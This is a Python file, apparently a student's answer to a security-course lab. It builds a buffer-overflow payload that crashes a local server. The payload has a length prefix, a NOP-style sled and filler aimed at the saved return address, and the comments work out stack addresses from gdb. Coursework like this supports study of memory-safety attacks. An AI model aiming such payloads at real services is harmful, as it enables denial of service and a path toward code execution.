import os
import socket
import struct


HOST = '127.0.0.1'
PORT = 8000


def get_payload() -> bytes:
    """
    This function returns the data to send over the socket to the server.

    This data should cause the server to crash and generate a core dump. Make
    sure to return a `bytes` object and not an `str` object.

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the payload.
    """
    # TODO: IMPLEMENT THIS FUNCTION
    #raise NotImplementedError()  
    lst = []
    
    size =[]
    
    size.append(0x00)
    size.append(0x00)
    size.append(0x05)
    size.append(0x90)
    #now size is 1424, seems to work
   
    #esp equal bfffe160, so need to substrackt (1024+16+4)?
    #meaning 0xbfffe160 - 1044 = 0xbfffdd4c?
    #what i see in gdb is 0xbfffdd4a? no my bad, the above calculation is correct
    #the address of the buffer is 0xbfffdd4c
    
    for i in range(1024+16):#range(1024) , add 16?
        lst += [144]
    
    #found out that 1040 bytes after buffer address start return address
    for i in range(100):
        lst += [i+20]*4
    
    #add null byte?   
    lst += [0]
    return bytes(size+lst)

def main():
    # WARNING: DON'T EDIT THIS FUNCTION!
    payload = get_payload()
    conn = socket.socket()
    conn.connect((HOST, PORT))
    try:
        conn.sendall(payload)
    finally:
        conn.close()


if __name__ == '__main__':
    main()
